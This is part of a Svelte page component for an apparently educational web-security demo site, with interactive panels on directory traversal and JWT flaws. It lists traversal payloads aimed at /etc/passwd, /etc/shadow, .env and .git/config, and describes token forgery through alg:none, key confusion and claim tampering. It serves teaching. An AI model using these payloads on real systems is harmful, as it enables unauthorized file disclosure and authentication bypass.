											href="https://www.einpresswire.com/article/579593407/video-iranian-regime-s-islamic-culture-and-communications-organization-targeted-in-massive-cyber-offensive"
										>
											<img
												src="/try/cok/pic1.png"
												alt="Microsoft cookie theft"
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
										<a
											href="https://ciso.economictimes.indiatimes.com/news/finnish-parliament-website-targeted-in-cyber-attack/93470177"
										>
											<img
												src="/try/cok/pic2.png"
												alt="Instagram cookie theft"
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
									</div>
								</div>
							</div>
						{:else if vulHeader === 'Directory Traversal'}
							<div transition:fade class="flex flex-col gap-4 p-1">
								<div transition:fade class="flex flex-col gap-4 p-1">
									<div class="flex flex-col gap-2">
										<span class="text-xl font-semibold"
											>How to test for Directory Traversal Vulnerabilities</span
										>
										<div class="flex flex-col space-y-4 rounded-lg px-2">
											<!-- Step 1 -->
											<div class="flex flex-col">
												<span class="font-bold text-gray-800"
													>1. Identify File Path Parameters:</span
												>
												<span class="px-4 text-gray-600">
													Look for parameters like <code class="rounded bg-gray-200 px-1 font-mono"
														>file=</code
													>,
													<code class="rounded bg-gray-200 px-1 font-mono">path=</code>, or
													<code class="rounded bg-gray-200 px-1 font-mono">document=</code> in URLs and
													forms
												</span>
											</div>

											<!-- Step 2 -->
											<div class="flex flex-col">
												<span class="font-bold text-gray-800"
													>2. Test Basic Traversal Sequences:</span
												>
												<div class="px-4 text-gray-600">
													Try common path traversal patterns:
													<ul class="mt-1 list-disc space-y-1 pl-6">
														<li>
															<code class="rounded bg-gray-200 px-1 font-mono"
																>../../etc/passwd</code
															>
														</li>
														<li>
															<code class="rounded bg-gray-200 px-1 font-mono"
																>..%2F..%2F..%2Fetc%2Fpasswd</code
															> (URL encoded)
														</li>
														<li>
															<code class="rounded bg-gray-200 px-1 font-mono"
																>....//....//....//etc/passwd</code
															> (double dot slash)
														</li>
													</ul>
												</div>
											</div>

											<!-- Step 3 -->
											<div class="flex flex-col">
												<span class="font-bold text-gray-800">3. Test Absolute Paths:</span>
												<span class="px-4 text-gray-600">
													Attempt absolute paths like <code
														class="rounded bg-gray-200 px-1 font-mono">/etc/passwd</code
													>
													or
													<code class="rounded bg-gray-200 px-1 font-mono"
														>C:\Windows\System32\drivers\etc\hosts</code
													>
												</span>
											</div>

											<!-- Step 4 -->
											<div class="flex flex-col">
												<span class="font-bold text-gray-800">4. Test Null Byte Injection:</span>
												<span class="px-4 text-gray-600">
													Try bypassing filters with null bytes:
													<code class="rounded bg-gray-200 px-1 font-mono">../../etc/passwd%00</code
													>
												</span>
											</div>

											<!-- Step 5 -->
											<div class="flex flex-col">
												<span class="font-bold text-gray-800">5. Check for File Disclosure:</span>
												<span class="px-4 text-gray-600">
													Verify if you can access sensitive files like:
													<ul class="mt-1 list-disc space-y-1 pl-6">
														<li>
															Configuration files (<code class="rounded bg-gray-200 px-1 font-mono"
																>.env</code
															>, <code class="rounded bg-gray-200 px-1 font-mono">config.php</code>)
														</li>
														<li>
															System files (<code class="rounded bg-gray-200 px-1 font-mono"
																>/etc/passwd</code
															>,
															<code class="rounded bg-gray-200 px-1 font-mono">/etc/shadow</code>)
														</li>
														<li>
															Source code (<code class="rounded bg-gray-200 px-1 font-mono"
																>.git/config</code
															>)
														</li>
													</ul>
												</span>
											</div>
										</div>
									</div>

									<div class="flex flex-col gap-2">
										<span class="text-xl font-semibold">Try it out...</span>
										<div class="flex flex-col gap-4 rounded-lg border p-4">
											<div class="flex items-center gap-2">
												<label class="flex items-center gap-2">
													<input
														type="checkbox"
														bind:checked={isSafeMode}
														class="rounded border-gray-300"
													/>
													Safe Mode
												</label>
											</div>

											<div class="flex flex-row gap-2">
												<input
													type="text"
													class="w-full rounded-lg border p-2"
													bind:value={filePath}
													placeholder="Enter file path (e.g., ../../etc/passwd)"
												/>
												<button
													class="w-24 rounded-lg border hover:bg-zinc-100"
													on:click={tryTraversal}
												>
													Try
												</button>
												<button
													class="w-24 rounded-lg border hover:bg-zinc-100"
													on:click={resetTraversal}
												>
													Reset
												</button>
											</div>

											{#if traversalResult}
												<div
													class="mt-2 rounded border bg-gray-50 p-2 font-mono text-sm whitespace-pre-wrap"
												>
													{traversalResult}
												</div>
											{/if}

											<div class="mt-2 text-sm text-gray-500">
												Try: <code class="rounded bg-gray-200 px-1">../../etc/passwd</code> or
												<code class="rounded bg-gray-200 px-1">..%2F..%2Fconfig.php</code>
											</div>
										</div>
									</div>

									<div class="flex flex-col gap-2">
										<span class="text-xl font-semibold">Why Directory Traversal is Dangerous</span>
										<div class="space-y-4">
											<!-- Point 1 -->
											<div class="flex items-center gap-3">
												<div
													class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
												>
													1
												</div>
												<div>
													<span class="text-lg font-medium text-gray-700"
														>Sensitive Data Exposure</span
													>
													<p class="text-gray-600">
														Attackers can access passwords, API keys, and system files that were
														never meant to be exposed.
													</p>
												</div>
											</div>

											<!-- Point 2 -->
											<div class="flex items-center gap-3">
												<div
													class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
												>
													2
												</div>
												<div>
													<span class="text-lg font-medium text-gray-700">System Compromise</span>
													<p class="text-gray-600">
														Access to configuration files can lead to full system takeover by
														revealing credentials and security settings.
													</p>
												</div>
											</div>

											<!-- Point 3 -->
											<div class="flex items-center gap-3">
												<div
													class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
												>
													3
												</div>
												<div>
													<span class="text-lg font-medium text-gray-700">Source Code Theft</span>
													<p class="text-gray-600">
														Proprietary business logic and intellectual property can be stolen
														through exposed source code files.
													</p>
												</div>
											</div>
										</div>
									</div>

									<div class="flex flex-col gap-2">
										<span class="text-xl font-semibold">Directory Traversal in the News</span>
										<div class="flex w-full flex-row items-center justify-center gap-4">
											<a
												href="https://www.cybersecuritydive.com/news/cisa-fbi-software-vulnerabilities/715368/"
											>
												<img
													src="/try/dir/pic1.png"
													alt="WordPress traversal vulnerability"
													class="border-xl h-56 rounded-xl border-2"
												/>
											</a>
											<a
												href="https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-directory-traversal-vulnerabilities-software"
											>
												<img
													src="/try/dir/pic2.png"
													alt="Open source traversal vulnerability"
													class="border-xl h-56 rounded-xl border-2"
												/>
											</a>
										</div>
									</div>
								</div>
							</div>
						{:else if vulHeader === 'JWT (JSON Web Token) Vulnerabilities'}
							<div transition:fade class="flex flex-col gap-4 p-1">
								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">How to test for JWT Vulnerabilities</span>
									<div class="flex flex-col space-y-4 rounded-lg px-2">
										<!-- Step 1 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">1. Identify JWT Usage:</span>
											<span class="px-4 text-gray-600">
												Look for tokens in <code class="rounded bg-gray-200 px-1 font-mono"
													>Authorization: Bearer</code
												>
												headers or
												<code class="rounded bg-gray-200 px-1 font-mono">session</code> cookies
											</span>
										</div>

										<!-- Step 2 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">2. Test Algorithm Vulnerabilities:</span
											>
											<div class="px-4 text-gray-600">
												Try these common attacks:
												<ul class="mt-1 list-disc space-y-1 pl-6">
													<li>
														<strong>None Algorithm:</strong> Change
														<code class="rounded bg-gray-200 px-1 font-mono">alg: HS256</code>
														to <code class="rounded bg-gray-200 px-1 font-mono">alg: none</code>
													</li>
													<li>
														<strong>Key Confusion:</strong> Use public key as HMAC secret when algorithm
														is changed
													</li>
													<li>
														<strong>Weak Secrets:</strong> Brute-force weak HMAC secrets (like "secret")
													</li>
												</ul>
											</div>
										</div>

										<!-- Step 3 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">3. Test Payload Tampering:</span>
											<span class="px-4 text-gray-600">
												Modify claims like <code class="rounded bg-gray-200 px-1 font-mono"
													>admin: false</code
												>
												to
												<code class="rounded bg-gray-200 px-1 font-mono">admin: true</code> without proper
												signature
											</span>
										</div>

										<!-- Step 4 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">4. Check Expiration Validation:</span>
											<span class="px-4 text-gray-600">
												Test if expired tokens (<code class="rounded bg-gray-200 px-1 font-mono"
													>exp</code
												> claim) are still accepted
											</span>
										</div>

										<!-- Step 5 -->
										<div class="flex flex-col">
											<span class="font-bold text-gray-800">5. Verify Signature Validation:</span>
											<span class="px-4 text-gray-600">
												Check if tokens with invalid/removed signatures are accepted
											</span>
										</div>
									</div>
								</div>

								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Try it out...</span>
									<div class="flex flex-col gap-4 rounded-lg border p-4">
										<div class="flex items-center gap-2">
											<label class="flex items-center gap-2">
												<input
													type="checkbox"
													bind:checked={isJwtSafeMode}
													class="rounded border-gray-300"
												/>
												Safe Mode
											</label>
										</div>

										<div class="flex flex-col gap-2">
											<div class="flex flex-row gap-2">
												<input
													type="text"
													class="w-full rounded-lg border p-2"
													bind:value={jwtToken}
													placeholder="Enter JWT token"
												/>
												<button
													class="w-24 rounded-lg border hover:bg-zinc-100"
													on:click={loadSampleToken}
												>
													Sample
												</button>
											</div>

											<div class="flex flex-row gap-2">
												<button
													class="flex-1 rounded-lg border hover:bg-zinc-100"
													on:click={tryJWT}
												>
													Analyze
												</button>
												<button
													class="flex-1 rounded-lg border hover:bg-zinc-100"
													on:click={modifyJWT}
												>
													Modify
												</button>
												<button
													class="flex-1 rounded-lg border hover:bg-zinc-100"
													on:click={resetJWT}
												>
													Reset
												</button>
											</div>
										</div>

										{#if jwtResult}
											<div
												class="mt-2 rounded border bg-gray-50 p-2 font-mono text-sm whitespace-pre-wrap"
											>
												{jwtResult}
											</div>
										{/if}

										<div class="mt-2 text-sm text-gray-500">
											Try: <code class="rounded bg-gray-200 px-1">Change alg to "none"</code> or
											<code class="rounded bg-gray-200 px-1">Modify admin:false to true</code>
										</div>
									</div>
								</div>

								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">Why JWT Vulnerabilities are Dangerous</span>
									<div class="space-y-4">
										<!-- Point 1 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												1
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Authentication Bypass</span>
												<p class="text-gray-600">
													Attackers can forge tokens or modify existing ones to gain unauthorized
													access as admin users.
												</p>
											</div>
										</div>

										<!-- Point 2 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												2
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Privilege Escalation</span>
												<p class="text-gray-600">
													Modified claims can grant elevated privileges without proper authorization
													checks.
												</p>
											</div>
										</div>

										<!-- Point 3 -->
										<div class="flex items-center gap-3">
											<div
												class="flex h-10 w-10 items-center justify-center rounded-full bg-red-500 text-lg font-bold text-white"
											>
												3
											</div>
											<div>
												<span class="text-lg font-medium text-gray-700">Session Hijacking</span>
												<p class="text-gray-600">
													Weak signature validation allows attackers to impersonate legitimate users
													indefinitely.
												</p>
											</div>
										</div>
									</div>
								</div>

								<div class="flex flex-col gap-2">
									<span class="text-xl font-semibold">JWT Vulnerabilities in the News</span>
									<div class="flex w-full flex-row items-center justify-center gap-4">
										<a
											href="https://thehackernews.com/2023/01/critical-security-flaw-found-in.html"
										>
											<img
												src="/try/jwt/pic1.png"
												alt="Auth0 JWT vulnerabilities"
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
										<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48238">
											<img
												src="/try/jwt/pic2.png"
												alt="JWT library flaw"
												class="border-xl h-56 rounded-xl border-2"
											/>
										</a>
									</div>
								</div>
							</div>
						{:else}
							<div class="mt-4 p-4">
								<p>Select a vulnerability from the right panel to see interactive examples.</p>
							</div>
						{/if}
					</div>
				</div>
			</div>
			<div class="flex w-[30%] flex-col gap-4">
				{#each cards as card, index}
					<SmallCard
						header={card.header}
						description={card.description}
						isExpanded={expandedIndex === index}
						onClick={() => toggleCard(index, card.header)}
					/>
				{/each}
			</div>
		</section>
	</section>

	<!-- how to get into cyber security -->
	<section class="-mt-20 flex flex-col p-8">
		<Header header="getting into cyber security" direction="start" />

		<div class="mt-12 flex flex-row gap-4">
			{#each steps as step}
				<MediumCard header={step.header} description={step.description} image={step.image} />
			{/each}
		</div>
	</section>

	<footer class="w-full text-lg font-semibold p-8 flex items-center justify-center text-center">
		made with blood, sweat and tears <span></span> with chances of getting hacked
	</footer>
</main>

<style>
	.pop-up {
		opacity: 0;
		transform: scale(0.5);
		animation: popIn 0.5s forwards;
		animation-delay: var(--delay);
	}

	@keyframes popIn {
		to {
			opacity: 1;
			transform: scale(1);
		}
	}

	.opacity-0 {
		opacity: 0;
	}

	.animate-fade-in {
		animation: fadeIn 0.5s ease-out forwards;
	}

	@keyframes fadeIn {
		from {
			opacity: 0;
			transform: translateY(20px);
		}
		to {
			opacity: 1;
			transform: translateY(0);
		}
	}

	.text-stroke {
		-webkit-text-stroke: 4px white;
		paint-order: stroke fill;
	}
</style>
